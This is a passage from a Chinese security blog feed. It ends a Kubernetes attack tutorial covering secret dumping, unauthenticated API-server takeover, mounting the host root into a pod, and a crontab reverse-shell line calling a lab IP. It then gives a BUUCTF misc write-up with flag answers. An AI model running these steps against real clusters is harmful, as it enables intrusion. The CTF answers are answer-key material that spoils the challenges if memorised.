class="line">./cdk run k8s-secret-dump auto</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-15.png" alt="secret"></p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><p>对于已经获取了kubeconfig或sa账号权限，进而想要创建特殊配置的容器，但是受到了K8s Pod Security Policies的限制时可以使用这个Exploit获取Pod Security Policies的规则信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-psp-dump (auto|&lt;service-account-token-path&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">./cdk run k8s-psp-dump auto</span><br><span class="line">2021/03/24 22:15:58 getting K8s api-server API addr.</span><br><span class="line">    Find K8s api-server in ENV: https://ip:8443</span><br><span class="line">2021/03/24 22:15:58 trying to dump K8s Pod Security Policies with local service-account: token</span><br><span class="line">2021/03/24 22:15:58 requesting  /apis/policy/v1beta1/podsecuritypolicies</span><br><span class="line">2021/03/24 22:15:58 dump Pod Security Policies success, saved in:  k8s_pod_security_policies.json</span><br><span class="line">2021/03/24 22:15:58 requesting  /api/v1/namespaces/default/pods</span><br><span class="line">2021/03/24 22:15:58 K8S Pod Security Policies rule list:</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostPID: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostIPC: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[0].hostPath.pathPrefix: \&quot;/proc\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[1].hostPath.pathPrefix: \&quot;/dev\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[2].hostPath.pathPrefix: \&quot;/sys\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[3].hostPath.pathPrefix: \&quot;/\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_ADMIN\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_PTRACE\&quot; &#125; is not allowed.</span><br></pre></td></tr></table></figure><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p><img src="/simg/K8s-16.png" alt="port"></p><h2 id="内部网络"><a href="#内部网络" class="headerlink" title="内部网络"></a>内部网络</h2><p>Flannel默认使用10.244.0.0&#x2F;16网络<br>Calico默认使用192.168.0.0&#x2F;16网络</p><h1 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h1><p>这一部分主要介绍一些常见的因为K8s自身的漏洞或者安全配置不当导致的可被利用的漏洞点：</p><h2 id="未授权类"><a href="#未授权类" class="headerlink" title="未授权类"></a>未授权类</h2><h3 id="K8s-API-Server未授权"><a href="#K8s-API-Server未授权" class="headerlink" title="K8s API Server未授权"></a>K8s API Server未授权</h3><h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><p>k8s的Master节点上会暴露kube-apiserver，默认情况下会开启以下两个HTTP端口：<br>A：Localhost Port</p><ul><li>HTTP服务</li><li>主机访问受保护</li><li>在HTTP中没有认证和授权检查</li><li>默认端口8080，修改标识–insecure-port</li><li>默认IP是本地主机，修改标识—insecure-bind-address</li></ul><p>B：Secure Port</p><ul><li>使用基于策略的授权方式</li><li>认证方式，令牌文件或者客户端证书</li><li>默认端口6443，修改标识—secure-port</li><li>默认IP是首个非本地主机的网络接口，修改标识—bind-address</li><li>HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file</li></ul><p>以上两个端口主要存在以下两类安全风险：<br>开发者使用8080端口并将其暴露在公网上，攻击者就可以通过该端口的API直接对集群下发指令<br>运维人员将”system:anonymous”用户绑定到”cluster-admin”用户组，使匿名用户可以通过6443端口以管理员权限向集群内部下发指令</p><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>在浏览器中访问以下URL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">http://ip:port/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">http://192.168.17.144:8080/</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-17.png" alt="poc"><br>返回以上信息说明存在K8s API Server未授权访问漏洞~</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用方式按严重程度可分为以下两种攻击类型：</p><ul><li>通过利用kubectl客户端调用Secure Port接口去控制已经创建好的容器</li><li>通过创建一个自定义的容器将系统根目录的文件挂载到&#x2F;mnt目录，之后通过修改&#x2F;mnt&#x2F;etc&#x2F;crontab来影响宿主机的crontab，通过反弹Shell拿到宿主机的权限</li></ul><h4 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h4><p>Step 1：获取目标机器的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port get nodes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 get nodes</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-18.png" alt="container"><br>备注说明：如果出现”Error from server (NotFound): the server could not find the requested resource”报错，可能是因为Kubectl客户端和K8s的Server端版本不相同导致的需要进行降级操作，此时需要将版本降低到和目标主机版本一致即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.8.7/bin/linux/amd64/kubectl</span><br><span class="line">chmod 777 kubectl</span><br><span class="line">mv /usr/bin/kubectl /usr/bin/kubectl.bak</span><br><span class="line">mv kubectl /usr/bin/kubectl</span><br></pre></td></tr></table></figure><p>Step 2：获取命名空间<br><code>kubectl -s 192.168.17.144:8080 get namespace</code><br><img src="/simg/K8s-19.png" alt="namespace"></p><p>Step 3：获取某一命名空间下的Pod列表<br><code>kubectl -s 192.168.17.144:8080 get pod -n default</code></p><p>Step 4：执行以下命令接管pod，可以看到下方返回的提示是”pod nginx does not have a host assigned”，这是由于pod未指定host所致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port  --namespace=default exec -it dockername bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 -n default exec -it nginx /bin/sh</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-20.png" alt="pod"></p><p>nginx的yaml文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>                      </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>                           </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span>                       </span><br><span class="line"><span class="attr">spec:</span>                               </span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span>             </span><br><span class="line">    <span class="attr">name:</span> <span class="string">container-0</span>               </span><br><span class="line">    <span class="attr">resources:</span>                      </span><br><span class="line">      <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">  <span class="attr">imagePullSecrets:</span>                 </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default-secret</span></span><br></pre></td></tr></table></figure><p>如果幸运的化我们可以找到恰当的Pod并通过信息收集以及逃逸获取宿主机的权限，之后控制节点以及整个集群</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>A、Web Dashboard<br>Step 1：查看当前Namespace确定命名空间有哪些<br><code>kubectl -s 192.168.17.144:8080 get namespaces</code><br><img src="/simg/K8s-21.png" alt="namespace"></p><p>Step 2：查看”kubernetes-dashboard”命名空间下pod与service的详细状态<br><code>kubectl -s 192.168.17.144:8080 get pods,svc -n kubernetes-dashboard -o wide</code><br><img src="/simg/K8s-22.png" alt="dashboard"></p><p>Step 3：查看Serviceaccount和Secrets<br><code>kubectl -s 192.168.17.144:8080 get sa,secrets -n kubernetes-dashboard</code><br><img src="/simg/K8s-23.png" alt="secrets"></p><p>Step 4：查看token，在这里我们要根据上一步的输出进行多项service-account-token的查看，因为部分会应权限而导致操作有限<br><code>kubectl -s 192.168.17.144:8080 describe secrets admin-myuser-token-jcj9d -n kubernetes-dashboard</code><br><img src="/simg/K8s-24.png" alt="token"></p><p>Step 5：尝试登录DashBoard<br><img src="/simg/K8s-25.png" alt="login"></p><p>Step 6：创建一个pod，并将本地根目录挂载到pod的&#x2F;mnt目录中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-26.png" alt="pod"><br><img src="/simg/K8s-27.png" alt="pod"></p><p>Step 7：之后可以看到创建的myapp Pod<br><img src="/simg/K8s-28.png" alt="pod"></p><p>Step 8：之后进入挂载的&#x2F;mnt目录中，就是master节点的对应目录了<br><img src="/simg/K8s-29.png" alt="pod"><br><img src="/simg/K8s-30.png" alt="pod"></p><p>Step 9：之后写计划任务<br><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.17.158/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</code><br><img src="/simg/K8s-31.png" alt="pod"></p><p>Step 10：成功反弹shell<br><img src="/simg/K8s-32.png" alt="pod"></p><p>后面懒得写了…</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://xz.aliyun.com/t/12921">K8s集群安全攻防(上)</a><br><a href="https://xz.aliyun.com/t/12930">K8s集群安全攻防(下)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MISC杂项 - buuctf</title>
    <link href="http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/"/>
    <id>http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/</id>
    <published>2023-10-31T16:00:00.000Z</published>
    <updated>2023-12-11T13:23:13.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>MISC杂项的学习。</p><span id="more"></span><h1 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1 - 签到题"></a>1 - 签到题</h1><p>加buuctf的qq群，没加进去…</p><h1 id="2-金三胖"><a href="#2-金三胖" class="headerlink" title="2 - 金三胖"></a>2 - 金三胖</h1><p>打开下载的压缩包文件，是一个gif<br>打开gif，发现一闪而过的flag<br>用potplayer逐帧播放，成功拿到flag<br><code>flag&#123;he11ohongke&#125;</code></p><h1 id="3-你竟然赶我走"><a href="#3-你竟然赶我走" class="headerlink" title="3 - 你竟然赶我走"></a>3 - 你竟然赶我走</h1><p>打开下载的压缩包文件，是一个jpg<br>打开jpg无明显特征<br>使用notepad++插件 Hex-Editor 查看16进制文件<br>然后发现在jpg的文件尾 <code>FF D9</code> 后还有一些额外的16进制数据，查看发现flag<br><code>flag&#123;stego_is_s0_bor1ing&#125;</code></p><h1 id="4-二维码"><a href="#4-二维码" class="headerlink" title="4 - 二维码"></a>4 - 二维码</h1><p>打开下载的压缩包文件，是一个二维码<br>kali下使用binwalk工具，发现二维码中隐藏了一个zip文件，于是使用foremost工具分离二维码。<br>得到zip，解压需要知道密码。通过ARCHPR软件破解密码，直接使用数字暴力破解即可。密码是7639<br>解压得到txt文件，读取flag。<br><code>flag&#123;vjpw_wnoei&#125;</code></p><h1 id="5-大白"><a href="#5-大白" class="headerlink" title="5 - 大白"></a>5 - 大白</h1><p>打开下载的压缩包文件，是一个png<br>根据题目提示，尝试修改题目的宽高<br>在第17-20字节之间是图片的长，第21-24字节之间是图片的高。<br>修改图片的高，其实就是增大16进制的值，拿到隐藏的部分flag<br><code>flag&#123;He1l0_d4_ba1&#125;</code></p><h1 id="6-N种方法解决"><a href="#6-N种方法解决" class="headerlink" title="6 - N种方法解决"></a>6 - N种方法解决</h1><p>打开下载的压缩包文件，是一个exe<br>点击无法运行。<br>于是用010editor工具打开，发现一个data输出流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/jpg;base64,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</span><br></pre></td></tr></table></figure><p>直接在浏览器中打开，发现是一张二维码。<br>使用微信扫二维码，得到：<br><code>KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code><br>将KEY改为flag，提交成功<br><code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p><h1 id="7-乌镇峰会种图"><a href="#7-乌镇峰会种图" class="headerlink" title="7 - 乌镇峰会种图"></a>7 - 乌镇峰会种图</h1><p>打开下载的jpg图片，比较模糊。<br>查看属性，没有收获。<br>使用010editor工具打开jpg图片<br>搜索flag，得到：<br><code>flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></p><h1 id="8-wireshark"><a href="#8-wireshark" class="headerlink" title="8 - wireshark"></a>8 - wireshark</h1><p>通过题目可知，需要通过wireshark进行流量分析，找到密码。<br>那么打开wireshark，直接搜索login，找到第一个POST界面。基本就是登录时输入密码的流量包。<br>然后就得到POST数据：<br><code>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG</code><br>由于密码即为flag，那么直接：<br><code>flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></p><h1 id="9-基础破解"><a href="#9-基础破解" class="headerlink" title="9 - 基础破解"></a>9 - 基础破解</h1><p>打开下载的压缩包文件，得到一个rar<br>根据题目提示，需要破解四位数字密码加密的rar文件才能获得flag信息。<br>于是使用ARCHPR工具进行暴力破解<br>得到密码2563<br>然后解密，得到flag.txt文件，打开是一个base64加密的字符串。<br>使用base64解密，得到：<br><code>flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></p><h1 id="10-文件中的秘密"><a href="#10-文件中的秘密" class="headerlink" title="10 - 文件中的秘密"></a>10 - 文件中的秘密</h1><p>打开下载的压缩包文件，得到一个jpeg<br>正常方式打开jpeg，没有发现特别的东西。<br>使用010editor工具搜索flag，也没有发现。<br>打开文件property，发现comments有flag：<br><code>flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></p><h1 id="11-LSB"><a href="#11-LSB" class="headerlink" title="11 - LSB"></a>11 - LSB</h1><p>打开下载的压缩包文件，得到一个png<br>根据题目提示的LSB，那么可以使用Stegsolve工具和zsteg工具。<br>首先尝试了zsteg工具，在github上clone文件。然后需要下载安装ruby语言环境，然后通过 <code>gem install zsteg</code> 安装zsteg<br>但是安装完成后使用，出现了报错，简单查询后无法解决，于是放弃。<br>接下来尝试了Stegsolve工具，通过网上的搜索下载到jar。<br>该工具需要Java环境，由于我已经安装Java，所以直接打开jar文件，然后将图片放上去。<br>接下来变换RGB通道，发现在Red plane 0, Green plane 0, Blue plane 0通道发现图片上方有东西。<br>于是通过 Analyse -&gt; Data Extract<br>在Bit Planes一栏，将Red，Green和Blue均改为0，同时在Bit Order一栏调为LSB First，其它不变。<br>最终生成了名为flag.png的二维码。</p><p>接下来使用QR Research工具，解码数据得到：<br><code>cumtctf&#123;1sb_i4_s0_Ea4y&#125;</code><br>修改为答案格式：<br><code>flag&#123;1sb_i4_s0_Ea4y&#125;</code></p><h1 id="12-zip伪加密"><a href="#12-zip伪加密" class="headerlink" title="12 - zip伪加密"></a>12 - zip伪加密</h1><p>下载压缩包文件，发现无法打开，提示需要输入密码。<br>根据题目提示zip伪加密，了解了zip伪加密的知识。<br>简单来说，就是zip文件本身没有加密，但是修改了全局方式位标记从 <code>00 00</code> 变为 <code>09 00</code> ，就会被判定为加密的zip文件。<br>我们只需要将16进制修改为 <code>00 00</code> 即可。（注意压缩源文件数据区和压缩源文件目录区的标记都要修改）<br>成功解压缩得到flag.txt<br>得到flag：<br><code>flag&#123;Adm1N-B2G-kU-SZIP&#125;</code></p><h1 id="13-被嗅探的流量"><a href="#13-被嗅探的流量" class="headerlink" title="13 - 被嗅探的流量"></a>13 - 被嗅探的流量</h1><p>打开下载的压缩包文件，是一个wireshark相关文件，使用wireshark打开，分析流量。<br>重点查找GET，POST upload file的关键词部分，最终在 <code>POST /upload.php HTTP/1.1</code> 处，通过查看16进制数据，找到flag（不能复制有点离谱）<br><code>flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</code></p><h1 id="14-rar"><a href="#14-rar" class="headerlink" title="14 - rar"></a>14 - rar</h1><p>打开下载的压缩包文件，是一个rar<br>需要输入4位纯数字的密码</p><p>和之前的方式相同，使用ARCHPR破解。<br>得到flag：<br><code>flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></p><h1 id="15-qr"><a href="#15-qr" class="headerlink" title="15 - qr"></a>15 - qr</h1><p>打开下载的二维码图片，使用QR Research工具，得到：<br><code>flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></p><h1 id="16-镜子里面的世界"><a href="#16-镜子里面的世界" class="headerlink" title="16 - 镜子里面的世界"></a>16 - 镜子里面的世界</h1><p>打开下载的压缩包文件，是一个png<br>查看文件属性，原图片，原图片的16进制均无法得到flag<br>于是通过Stegsolve工具，变换RGB通道，发现在Red plane 0, Green plane 0, Blue plane 0通道发现图片上方有东西。<br>于是通过 Analyse -&gt; Data Extract<br>在Bit Planes一栏，将Red，Green和Blue均改为0，同时在Bit Order一栏调为LSB First，其它不变。<br>得到flag.png文件，文件无法通过普通方式打开，使用010Editor打开，发现flag值：<br><code>flag&#123;st3g0_saurus_wr3cks&#125;</code></p><h1 id="17-ningen"><a href="#17-ningen" class="headerlink" title="17 - ningen"></a>17 - ningen</h1><p>打开下载的文件，是一个png<br>根据题目提示信息，可推测有文件附加<br>于是使用foremost分离文件，得到zip<br>4位纯数字解密，使用ARCHPR工具，解压得到：<br><code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p><h1 id="18-小明的保险箱"><a href="#18-小明的保险箱" class="headerlink" title="18 - 小明的保险箱"></a>18 - 小明的保险箱</h1><p>解法和17题一模一样。</p><h1 id="19-爱因斯坦"><a href="#19-爱因斯坦" class="headerlink" title="19 - 爱因斯坦"></a>19 - 